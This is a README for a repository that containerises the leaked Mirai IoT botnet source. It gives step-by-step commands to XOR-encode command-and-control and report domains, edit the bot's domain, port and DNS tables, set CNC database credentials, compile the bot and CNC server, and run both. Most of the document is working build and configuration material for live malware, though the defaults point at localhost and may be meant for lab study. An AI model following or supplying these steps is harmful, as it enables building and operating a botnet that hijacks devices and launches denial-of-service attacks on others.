# Mirai-Docker

https://github.com/jgamblin/Mirai-Source-Code

### Install docker and docker compose
https://docs.docker.com/get-docker/

### Download source and dockerfile
```
git clone https://github.com/deunlee/Mirai-Docker
cd Mirai-Docker
```

### Build docker containers
```
docker compose build
```

### Encrypt your domain
```
docker compose run compile ./enc.sh string cnc.mirai.com
XOR'ing 14 bytes of data...
\x41\x4C\x41\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22
```
```
docker compose run compile ./enc.sh string report.mirai.com
XOR'ing 17 bytes of data...
\x50\x47\x52\x4D\x50\x56\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22
```

### Configuring bot
Edit some domains in [./src/mirai/bot/table.c](./src/mirai/bot/table.c)
```c
add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22", 30); // cnc.mirai.com
add_entry(TABLE_CNC_PORT, "\x22\x35", 2); // 23

add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22", 29); // report.mirai.com
add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2); // 48101
```

Edit DNS server in [./src/mirai/bot/resolv.c](./src/mirai/bot/resolv.c)
```c
struct resolv_entries *resolv_lookup(char *domain)
{
    // ...

    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(127,0,0,1); // <-- here!
    addr.sin_port = htons(53);

    // ...
}
```

### Configuring CNC
Edit database config in [./src/mirai/cnc/main.go](./src/mirai/cnc/main.go)
```go
const DatabaseAddr string   = "mariadb" // "127.0.0.1"
const DatabaseUser string   = "user"
const DatabasePass string   = "this-is-password!"
const DatabaseTable string  = "mirai"
```

Edit prompt path in [./src/mirai/cnc/admin.go](./src/mirai/cnc/admin.go)
```go
headerb, err := ioutil.ReadFile("/home/user/src/mirai/prompt.txt") // <-- here!
```

Edit CNC user in [./src/scripts/db.sql](./src/scripts/db.sql)
```sql
-- CREATE DATABASE mirai; --- comment!

CREATE TABLE `history` (

--- ...

  KEY `prefix` (`prefix`)
);

INSERT INTO users VALUES (NULL, 'mirai-user', 'mirai-pass', 0, 0, 0, 0, -1, 1, 30, ''); --- here!
```

### Compile bot and CNC
```
docker compose run compile ./build.sh
```

### Run CNC and database server
```
docker compose up mariadb -d
docker compose run compile sudo ./src/mirai/debug/cnc
docker compose exec compile telnet 127.0.0.1
```
telnet 127.0.0.1

<!--
### Connect database for test
```
docker compose run compile
mysql -h mariadb -P 3306 -u"user" -p"this-is-password!"
use mirai;
select * from users;
```
-->

### Run bot
```
docker compose run compile ./src/mirai/debug/mirai.dbg
```
